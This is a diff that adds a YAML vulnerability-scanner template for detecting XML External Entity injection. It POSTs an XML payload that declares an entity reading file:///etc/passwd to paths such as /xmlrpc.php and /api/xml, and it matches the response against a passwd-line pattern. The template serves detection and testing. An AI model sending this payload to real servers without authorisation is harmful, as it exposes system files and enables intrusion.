@@ -1,0 +1,30 @@
+id: xxe-basic
+
+info:
+  name: XML External Entity Injection
+  author: moriarty
+  severity: high
+  description: Detects XXE vulnerabilities
+  tags: xxe,injection,xml
+
+requests:
+  - method: POST
+    path:
+      - "/xmlrpc.php"
+      - "/api/xml"
+      - "/upload"
+
+    headers:
+      Content-Type: application/xml
+
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <root>
+        <data>&xxe;</data>
+      </root>
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
